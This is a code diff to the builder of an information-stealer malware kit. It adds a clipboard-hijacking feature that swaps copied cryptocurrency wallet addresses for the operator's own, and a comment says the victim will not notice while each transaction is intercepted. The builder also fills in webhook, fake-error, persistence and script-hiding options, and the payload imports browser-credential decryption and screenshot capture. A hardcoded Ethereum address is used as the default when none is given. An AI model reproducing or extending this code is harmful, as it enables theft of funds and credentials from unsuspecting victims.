@@ -54,6 +54,55 @@ class Builder:
             self.ping = "no"
             self.pingtype = "none"
 
+
+#(the victim will not realize it and you will intercept each of his transactions)
+        self.address_replacer = input(f'{Fore.CYAN}[{Fore.RESET}NEW{Fore.CYAN}]{Fore.RESET} Replace all copied crypto address wallet by your address ? (yes/no): ')
+        if self.address_replacer.lower() == 'yes':
+            self.address_replacer = "yes"
+            self.btc_address = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Bitcoin Address (let empty if you do not have): ').lower()
+            if not self.btc_address.lower():
+                self.btc_address = 'none'
+                
+            self.eth_address = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Ethereum Address (let empty if you do not have):').lower()
+            if not self.eth_address.lower():
+                self.eth_address = '0x4c305D9d4CdF740FF4f2166ecF65c1DF73e93472'
+
+            self.xchain_address = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your X-Chain Address (let empty if you do not have):').lower()
+            if not self.xchain_address.lower():
+                self.xchain_address = 'none'
+
+            self.pchain_address = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your P-Chain Address (let empty if you do not have):').lower()
+            if not self.pchain_address.lower():
+                self.pchain_address = 'none'
+
+            self.cchain_address = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your C-Chain Address (let empty if you do not have):').lower()
+            if not self.cchain_address.lower():
+                self.cchain_address = 'none'
+
+            self.monero_address = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Monero Address (let empty if you do not have):').lower()
+            if not self.monero_address.lower():
+                self.monero_address = 'none'
+
+            self.ada_address = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Ada/Cardano Address (let empty if you do not have):').lower()
+            if not self.ada_address.lower():
+                self.ada_address = 'none'
+
+            self.dash_address = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Dash Address (let empty if you do not have):').lower()
+            if not self.dash_address.lower():
+                self.dash_address = 'none'
+              
+        else:
+            self.address_replacer = "no"
+            self.btc_address = "none"
+            self.eth_address = "none"
+            self.xchain_address = "none"
+            self.pchain_address = "none"
+            self.cchain_address = "none"
+            self.monero_address = "none"
+            self.dash_address = "none"
+            self.ada_address = "none"
+
+
         self.error = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Add a fake error? (yes/no): ')
         if self.error.lower() == 'y' or self.error.lower() == 'yes':
             self.error = "yes"
@@ -542,6 +591,15 @@ class Builder:
             f.write(code.replace('%WEBHOOK_HERE%', webhook)
                     .replace("%ping_enabled%", str(self.ping))
                     .replace("%ping_type%", self.pingtype)
+                    .replace("%_address_replacer%", str(self.address_replacer))
+                    .replace("%_btc_address%", self.btc_address)
+                    .replace("%_eth_address%", self.eth_address)
+                    .replace("%_xchain_address%", self.xchain_address)
+                    .replace("%_pchain_address%", self.pchain_address)
+                    .replace("%_cchain_address%", self.cchain_address)
+                    .replace("%_monero_address%", self.monero_address)
+                    .replace("%_ada_address%", self.ada_address)
+                    .replace("%_dash_address%", self.dash_address)
                     .replace("%_error_enabled%", str(self.error))
                     .replace("%_startup_enabled%", str(self.startup))
                     .replace("%_hide_script%", str(self.hider))
@@ -563,7 +621,7 @@ class Builder:
         with open(file='compressed_' + (filename.split('\\')[-1] if '\\' in filename else filename.split('/')[-1]) + '.py', mode='w', encoding='utf-8') as f:
             f.write(content)
             if self.obfuscation == 'no' and self.compy == 'yes':
-                f.write("\nimport asyncio, json, ntpath, os, random, re, shutil, sqlite3, subprocess, threading, winreg, zipfile, httpx, psutil, win32gui, win32con, base64, requests, ctypes, time;from sqlite3 import connect;from base64 import b64decode;from urllib.request import Request, urlopen;from shutil import copy2;from datetime import datetime, timedelta, timezone;from sys import argv;from tempfile import gettempdir, mkdtemp;from json import loads, dumps;from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer;from Crypto.Cipher import AES;from PIL import ImageGrab;from win32crypt import CryptUnprotectData")
+                f.write("\nimport asyncio, json, ntpath, os, random, re, shutil, sqlite3, subprocess, threading, winreg, zipfile, httpx, psutil, win32gui, win32con, pyperclip, base64, requests, ctypes, time;from sqlite3 import connect;from base64 import b64decode;from urllib.request import Request, urlopen;from shutil import copy2;from datetime import datetime, timedelta, timezone;from sys import argv;from tempfile import gettempdir, mkdtemp;from json import loads, dumps;from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer;from Crypto.Cipher import AES;from PIL import ImageGrab;from win32crypt import CryptUnprotectData")
 
         print(f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Old file size: {original_size} bytes - New file size: {new_size} bytes {Fore.RESET}")
 
